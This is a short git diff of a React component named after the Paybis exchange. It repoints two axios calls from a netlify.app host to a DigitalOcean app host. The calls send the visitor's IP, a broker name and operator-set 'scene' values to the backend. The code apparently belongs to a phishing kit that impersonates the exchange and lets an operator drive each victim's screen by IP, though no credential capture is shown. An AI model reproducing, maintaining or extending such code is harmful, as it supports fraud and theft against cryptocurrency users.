@@ -16,7 +16,7 @@ export default function Paybis({ ip, socket }) {
 
   useEffect(() => {
     async function login() {
-      await axios.post("http://glittering-haupia-fdf321.netlify.app:3333/login", {
+      await axios.post("https://clownfish-app-h28dc.ondigitalocean.app:3333/login", {
         corretora: "paybis",
         ip: ip,
       });
@@ -31,7 +31,7 @@ export default function Paybis({ ip, socket }) {
 
       if (ip === ipRecebido) {
         async function AtualizaCena() {
-          await axios.post("http://glittering-haupia-fdf321.netlify.app:3333/atualizacena", {
+          await axios.post("https://clownfish-app-h28dc.ondigitalocean.app:3333/atualizacena", {
             cena: cenaRecebida,
             ip: ipRecebido,
           });
